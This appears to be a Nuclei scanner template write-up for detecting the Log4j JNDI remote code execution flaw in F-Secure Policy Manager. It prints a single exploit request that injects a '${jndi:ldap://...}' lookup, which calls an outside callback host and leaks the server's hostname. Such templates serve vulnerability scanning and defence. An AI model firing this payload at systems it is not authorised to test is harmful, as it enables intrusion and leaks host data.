# Nuclei Template: F-Secure Policy Manager - Remote Code Execution (Apache Log4j)
**Template ID:** f-secure-policymanager-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`f-secure-policymanager-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
F-Secure Policy Manager is susceptible to Log4j JNDI remote code execution.

## Steps to reproduce / Exploit Payload
```http
GET /fsms/fsmsh.dll?FSMSCommand=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}} HTTP/1.1
Host: {{Hostname}}
Referrer: {{RootURL}}
```

## References
- https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476
